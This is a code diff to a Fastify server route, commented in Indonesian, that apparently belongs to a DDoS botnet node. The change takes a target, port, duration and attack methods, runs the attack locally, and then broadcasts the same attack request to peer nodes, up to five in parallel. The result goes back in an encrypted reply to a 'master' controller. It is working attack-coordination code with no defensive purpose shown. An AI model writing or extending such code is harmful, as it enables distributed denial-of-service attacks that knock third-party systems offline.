@@ -494,26 +494,75 @@ fastify.post('/nz-sec', {
       port: validatedPort
     });
 
-    const result = await executor.execute(command, {
+    // 1) Jalankan attack lokal
+    const localResult = await executor.execute(command, {
       expectedDuration: validatedTime
     });
 
     console.log('[SECURE-EXEC SUCCESS]', {
       command: command.substring(0, 100) + '...',
-      processId: result.processId,
-      pid: result.pid
+      processId: localResult.processId,
+      pid: localResult.pid
     });
 
+    // 2) Broadcast ke P2P peers secepat mungkin (jika P2P aktif)
+    let p2pSummary = null;
+
+    if (p2pNode && p2pNode.p2pConfig.enabled && p2pNode.peers.size > 0) {
+      console.log('[SECURE-EXEC] Broadcasting attack to P2P peers...');
+
+      // Biar respon ke master tetap cepat, kita kasih timeout logika internal
+      const p2pPromise = p2pNode.broadcastAttackRequest({
+        target: validatedTarget,
+        time: validatedTime,
+        port: validatedPort,
+        methods: validatedMethods,
+        // targetPeerIds: [], // bisa diisi kalau mau pilih peer tertentu
+        maxParallel: 5
+      });
+
+      // Tunggu maximal 2 detik untuk dapat ringkasan
+      p2pSummary = await Promise.race([
+        p2pPromise,
+        new Promise((resolve) => setTimeout(() => resolve({
+          success: false,
+          summary: { totalTargets: p2pNode.peers.size, success: 0, failed: 0 },
+          timeout: true
+        }), 2000))
+      ]);
+
+      if (p2pSummary.timeout) {
+        console.log('[SECURE-EXEC] P2P broadcast still running in background (timeout 2s)');
+      } else {
+        console.log('[SECURE-EXEC] P2P broadcast done:', p2pSummary.summary);
+      }
+    } else {
+      console.log('[SECURE-EXEC] P2P not available or no peers, skip broadcast');
+    }
+
+    // 3) Kirim respon ke master termasuk info P2P
     sendEncryptedResponse(reply, {
       status: 'ok',
       target: validatedTarget,
       time: validatedTime,
       port: validatedPort,
       methods: validatedMethods,
-      processId: result.processId,
-      pid: result.pid,
+      processId: localResult.processId,
+      pid: localResult.pid,
       message: config.MESSAGES.EXEC_SUCCESS,
-      encrypted: request.encrypted || false
+      encrypted: request.encrypted || false,
+      p2p: p2pNode ? {
+        enabled: p2pNode.p2pConfig.enabled,
+        peers_connected: p2pNode.peers.size,
+        broadcast: p2pSummary
+          ? {
+              success: p2pSummary.success,
+              summary: p2pSummary.summary
+            }
+          : null
+      } : {
+        enabled: false
+      }
     }, 'attack_response');
 
   } catch (error) {
